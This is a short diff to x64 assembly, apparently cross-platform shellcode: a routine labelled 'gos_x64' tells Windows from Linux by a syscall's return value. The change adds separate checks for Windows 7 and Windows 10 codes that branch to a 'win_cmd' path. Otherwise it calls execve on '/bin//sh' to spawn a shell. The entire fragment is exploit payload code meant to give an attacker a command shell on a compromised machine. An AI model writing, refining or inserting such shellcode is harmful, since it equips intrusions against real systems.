@@ -97,12 +97,14 @@ gos_x64:
     push    -1
     pop     edi
     syscall
-    cmp     al, 5             ; Access Violation indicates windows
-    push    59
-    pop     eax
-    cdq
-    jz      win_cmd
+    cmp     al, 5             ; Windows 7
+    je      win_cmd
+    cmp     al, 8             ; Windows 10
+    je      win_cmd
     
+    push    59               ; sys_execve
+    pop     eax
+    cdq                      ; penv=0
     pop     edi              ; rdi="/bin//sh", 0
     pop     esi              ; rsi=argv
     syscall
